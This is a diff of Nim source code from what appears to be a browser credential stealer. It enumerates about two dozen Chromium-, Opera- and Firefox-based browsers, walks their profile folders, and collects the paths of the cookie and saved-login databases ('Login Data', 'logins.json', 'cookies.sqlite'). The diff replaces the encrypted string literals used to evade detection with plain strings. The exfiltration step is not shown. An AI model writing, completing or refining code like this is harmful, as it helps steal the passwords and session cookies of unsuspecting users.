@@ -1,6 +1,7 @@
 ## THIS THREAD MIGHT NEED OPTIMIZATIONS 
 ## BECAUSE OF THE CONSTANT ENCRYPTING AND DECRYPTING
 ## OF STRING LITERALS
+## TODO: HAVE A LOOK AT THIS AND TEST
 
 from os import `/`
 from os import getEnv
@@ -37,43 +38,43 @@ const browsers: array[3, browserType] = [
   (
     CHROME_BASED,
     @[
-      e"Google\Chrome",
-      e"Microsoft\Edge",
-      e"7Star\7Star",
-      e"Amigo",
-      e"BraveSoftware\Brave-Browser",
-      e"CentBrowser",
-      e"Chedot",
-      e"Google\Chrome SxS",
-      e"Chromium",
-      e"CocCoc\Browser",
-      e"Comodo\Dragon",
-      e"Elements Browser",
-      e"Epic Privacy Browser",
-      e"Kometa",
-      e"Orbitum",
-      e"Sputnik\Sputnik",
-      e"Torch",
-      e"uCozMedia\Uran",
-      e"Vivaldi",
-      e"Yandex\YandexBrowse"
+      "Google\\Chrome",
+      "Microsoft\\Edge",
+      "7Star\\7Star",
+      "Amigo",
+      "BraveSoftware\\Brave-Browser",
+      "CentBrowser",
+      "Chedot",
+      "Google\\Chrome SxS",
+      "Chromium",
+      "CocCoc\\Browser",
+      "Comodo\\Dragon",
+      "Elements Browser",
+      "Epic Privacy Browser",
+      "Kometa",
+      "Orbitum",
+      "Sputnik\\Sputnik",
+      "Torch",
+      "uCozMedia\\Uran",
+      "Vivaldi",
+      "Yandex\\YandexBrowse"
     ]
   ),
   (
     OPERA_BASED,
     @[
-      e"Opera Software\Opera Stable"
+      "Opera Software\\Opera Stable"
     ]
   ),
   (
     FIREFOX_BASED,
     @[
-      e"Mozilla\Firefox\Profiles",
-      e"NETGATE Technologies\BlackHawk",
-      e"8pecxstudios\Cyberfox",
-      e"Comodo\IceDragon",
-      e"K-Meleon,",
-      e"Mozilla\icecat"
+      "Mozilla\\Firefox\\Profiles",
+      "NETGATE Technologies\\BlackHawk",
+      "8pecxstudios\\Cyberfox",
+      "Comodo\\IceDragon",
+      "K-Meleon,",
+      "Mozilla\\icecat"
     ]
   ),
 ]
@@ -100,20 +101,20 @@ proc initSearchThread(args: browserThreadArgs): void {.thread.} =
       if isOpera:
         appdata / folder
       else:
-        localappdata / folder / d e"User Data"
+        localappdata / folder / "User Data"
 
     if existsDir(fullFolder):
       # add default user data
-      files.add d e"Default\Cookies"
-      files.add d e"Default\Login Data"
+      files.add "Default\\Cookies"
+      files.add "Default\\Login Data"
 
       for kind, maybeProfile in walkDir(fullFolder, true):
         if kind == pcDir:
           # if maybeProfile is a profile
-          if maybeProfile.startsWith(d e"Profile"):
+          if maybeProfile.startsWith("Profile"):
             # maybeProfile is now for sure a profile
-            files.add maybeProfile / d e"Cookies"
-            files.add maybeProfile / d e"Login Data"
+            files.add maybeProfile / "Cookies"
+            files.add maybeProfile / "Login Data"
 
   of FIREFOX_BASED:
     fullFolder = appdata / folder
@@ -121,8 +122,8 @@ proc initSearchThread(args: browserThreadArgs): void {.thread.} =
     if existsDir(fullFolder):
       for kind, profile in walkDir(fullFolder, true):
         if kind == pcDir:
-          files.add profile / d e"cookies.sqlite"
-          files.add profile / d e"logins.json"
+          files.add profile / "cookies.sqlite"
+          files.add profile / "logins.json"
 
   for file in files:
     let fullPath: string = fullFolder / file
@@ -137,8 +138,8 @@ proc initSearchThread(args: browserThreadArgs): void {.thread.} =
 
 proc initBrowserThread*(): void {.thread.} =
   let
-    appdata: string = getEnv(d e"appdata")
-    localappdata: string = getEnv(d e"localappdata")
+    appdata: string = getEnv("appdata")
+    localappdata: string = getEnv("localappdata")
 
   var
     threads: seq[browserThreadType] = newSeq[browserThreadType](noOfThreads)
@@ -150,7 +151,7 @@ proc initBrowserThread*(): void {.thread.} =
         initSearchThread,
         (
           browser.based,
-          d folder, # decrypt folder
+          folder, # decrypt folder
           appdata,
           localappdata
         )
